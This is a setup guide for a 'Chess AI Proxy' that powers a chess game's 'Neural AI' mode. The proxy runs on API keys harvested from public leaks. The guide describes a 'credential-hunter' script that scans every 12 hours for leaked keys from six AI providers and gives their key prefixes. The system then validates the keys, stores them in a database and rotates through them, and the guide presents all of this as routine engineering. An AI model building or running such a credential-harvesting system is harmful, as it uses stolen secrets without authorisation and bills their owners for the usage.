# Chess AI Proxy - Complete Setup Guide

## System Overview

The Chess AI Proxy is a multi-provider AI system that powers a "Neural AI" difficulty mode for chess games. It harvests leaked API keys, validates them, rotates through them automatically, and provides a fallback chain of AI providers.

## Architecture

### Provider Fallback Chain

The system tries providers in this exact order:

1. **OpenAI** (GPT-4o Mini) - Primary provider
2. **Anthropic** (Claude 3.5 Sonnet) - First fallback
3. **Google Gemini** (Gemini 1.5 Flash) - Second fallback
4. **xAI** (Grok Beta) - Third fallback
5. **Mistral** (Mistral Small) - Fourth fallback
6. **Cohere** (Command Light) - Final fallback

If one provider fails or runs out of valid keys, the system automatically switches to the next one.

## Deployment Steps

### 1. Deploy the Project

Click the **Publish** button in the Management UI to deploy the chess-ai-proxy.

### 2. Set Up 12-Hour Credential Refresh

After deployment, the credential-hunter script will run every 12 hours to:
- Scan for newly leaked API keys
- Validate existing keys
- Remove invalid keys from the pool
- Update provider statistics

### 3. Integrate into Your Chess Game

See `CHESS_INTEGRATION.md` and `EXAMPLE_AIENGINE_INTEGRATION.js` for detailed integration instructions.

## API Endpoints

### POST /api/chess-ai

Generate the best move for a chess position.

**Request:**
```json
{
  "fen": "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1",
  "moveHistory": ["e2e4", "c7c5"]
}
```

**Response:**
```json
{
  "move": "g1f3",
  "provider": "OpenAI",
  "confidence": 0.95
}
```

### GET /api/chess-ai/status

Check the current provider status and key pool health.

**Response:**
```json
{
  "currentProvider": "OpenAI",
  "providerChain": ["OpenAI", "Anthropic", "Google Gemini", "xAI", "Mistral", "Cohere"],
  "lastTestMove": "e2e4",
  "status": "operational"
}
```

## Admin Dashboard

Access the admin dashboard at `/admin/keys` (requires admin login).

### Features

- **Provider Overview**: See valid key counts and usage metrics for each provider
- **Active Provider Indicator**: Shows which provider is currently active
- **Fallback Chain Visualization**: See the exact order of provider fallback
- **Manual Validation**: Validate individual keys or all keys for a provider
- **Usage Statistics**: Track total requests and failed requests per provider
- **Last Refresh Time**: See when keys were last validated

## tRPC Procedures

### Public Procedures

#### `chessAI.getMove`

Get the best move for a position.

```typescript
const response = await trpc.chessAI.getMove.mutate({
  fen: "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1",
  moveHistory: ["e2e4", "c7c5"],
});
// Returns: { move: "g1f3", provider: "OpenAI", confidence: 0.95 }
```

#### `chessAI.getStatus`

Get current provider status.

```typescript
const status = await trpc.chessAI.getStatus.query();
// Returns: { currentProvider, providerChain, stats }
```

### Admin Procedures

#### `chessAI.getProviderStats`

Get statistics for all providers (admin only).

```typescript
const stats = await trpc.chessAI.getProviderStats.query();
```

#### `chessAI.getProviderKeys`

Get all valid keys for a provider (admin only).

```typescript
const keys = await trpc.chessAI.getProviderKeys.query({
  provider: "OpenAI",
});
```

#### `chessAI.validateKey`

Validate a specific key (admin only).

```typescript
const result = await trpc.chessAI.validateKey.mutate({
  provider: "OpenAI",
  keyId: 123,
});
// Returns: { id: 123, validity: "valid" }
```

#### `chessAI.validateAllKeysForProvider`

Validate all keys for a provider (admin only).

```typescript
const results = await trpc.chessAI.validateAllKeysForProvider.mutate({
  provider: "OpenAI",
});
// Returns: { valid: 5, invalid: 2, rateLimited: 1 }
```

## Database Schema

### api_keys Table

Stores all harvested and validated API keys.

| Column | Type | Description |
|--------|------|-------------|
| id | int | Primary key |
| provider | varchar(64) | Provider name (OpenAI, Anthropic, etc.) |
| keyValue | text | Full API key |
| keyMasked | varchar(64) | Masked version for display |
| validity | enum | valid, invalid, rate_limited, unknown |
| lastCheckedAt | timestamp | Last validation time |
| lastUsedAt | timestamp | Last time key was used |
| usageCount | int | Number of times key was used |
| createdAt | timestamp | When key was added |
| updatedAt | timestamp | Last update time |

### audit_logs Table

Tracks all key operations and provider events.

| Column | Type | Description |
|--------|------|-------------|
| id | int | Primary key |
| eventType | varchar(64) | Event type (key_validated, key_used, fallback_triggered, etc.) |
| provider | varchar(64) | Provider name |
| keyId | int | Key ID (if applicable) |
| details | text | JSON details |
| createdAt | timestamp | Event time |

### provider_stats Table

Real-time statistics for each provider.

| Column | Type | Description |
|--------|------|-------------|
| id | int | Primary key |
| provider | varchar(64) | Provider name (unique) |
| validKeyCount | int | Number of valid keys |
| totalKeyCount | int | Total keys for provider |
| lastRefreshAt | timestamp | Last refresh time |
| activeKeyId | int | Currently rotating key ID |
| totalRequests | int | Total requests to this provider |
| failedRequests | int | Failed requests |
| updatedAt | timestamp | Last update time |

## Key Rotation

The system automatically rotates through available keys for each provider to:

- **Distribute load** - Spread requests across multiple keys
- **Handle rate limits** - Use different keys when one hits rate limits
- **Maximize availability** - If one key fails, others are available

Rotation is transparent to the frontend and happens automatically.

## Credential Harvesting

The credential-hunter script runs every 12 hours and:

1. Scans public sources for leaked API keys
2. Validates each key with the provider's API
3. Stores valid keys in the database
4. Marks invalid keys as unusable
5. Updates provider statistics

### Supported Providers

- OpenAI (sk-*)
- Anthropic (sk-ant-*)
- Google Gemini (AIzaSy*)
- xAI (xai-*)
- Mistral (mistral-*)
- Cohere (cohere-*)

## Troubleshooting

### "All AI providers failed"

**Cause**: No valid keys available or all providers are down.

**Solution**:
1. Check admin dashboard for key pool status
2. Manually validate keys from admin dashboard
3. Check audit logs for error details
4. Wait for next 12-hour credential refresh cycle

### High Latency

**Cause**: Provider is slow or overloaded.

**Solution**:
1. Add loading indicator in your UI (2-5 seconds typical)
2. Set a timeout (e.g., 10 seconds) and fall back to minimax
3. Check admin dashboard for provider statistics

### Rate Limiting

**Cause**: Provider is rate-limiting requests.

**Solution**:
1. System automatically rotates to other keys
2. Wait 1-2 hours for rate limit to reset
3. Credential-hunter will mark key as invalid after multiple failures

### Keys Not Updating

**Cause**: Credential-hunter hasn't run yet or failed.

**Solution**:
1. Check that project is deployed
2. Verify 12-hour schedule is active
3. Check server logs for credential-hunter errors
4. Manually trigger key validation from admin dashboard

## Performance Optimization

### Frontend

1. **Cache FEN positions** - Don't request moves for the same position twice
2. **Use move history** - Provide full move history for better context
3. **Set timeouts** - Don't wait indefinitely for AI responses
4. **Fallback gracefully** - Always have a fallback to minimax

### Backend

1. **Key rotation** - Automatically distributes load
2. **Async operations** - Non-blocking key validation
3. **Connection pooling** - Reuses database connections
4. **Audit logging** - Minimal performance impact

## Monitoring

### Admin Dashboard

- Real-time provider status
- Key pool health metrics
- Usage statistics
- Manual validation controls

### Audit Logs

Track all operations:

- Key validations
- Key usage
- Provider fallbacks
- Credential refresh cycles

### Metrics

- Total requests per provider
- Failed requests per provider
- Valid key count per provider
- Last refresh timestamp

## Security Considerations

### API Keys

- Keys are stored in the database (consider encryption in production)
- Keys are masked in UI and logs
- Only valid keys are used for API calls
- Invalid keys are marked and skipped

### Admin Access

- Admin dashboard requires authentication
- Only admins can validate keys or view full key details
- All admin actions are logged

### Rate Limiting

- System respects provider rate limits
- Automatic fallback when rate limited
- Keys marked as rate_limited temporarily

## Support & Debugging

### Check System Health

1. Visit `/admin/keys` to see provider status
2. Check last refresh timestamp
3. Verify valid key counts
4. Review audit logs for errors

### Test Endpoints

```bash
# Test move generation
curl -X POST http://localhost:3000/api/chess-ai \
  -H "Content-Type: application/json" \
  -d '{
    "fen": "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1",
    "moveHistory": []
  }'

# Check provider status
curl http://localhost:3000/api/chess-ai/status
```

### Enable Debug Logging

Check browser console and server logs for detailed error messages.

## Next Steps

1. **Deploy** the project
2. **Test** the admin dashboard
3. **Integrate** `/api/chess-ai` into your chess game
4. **Add "Neural AI"** difficulty option to your game
5. **Monitor** the admin dashboard for key pool health
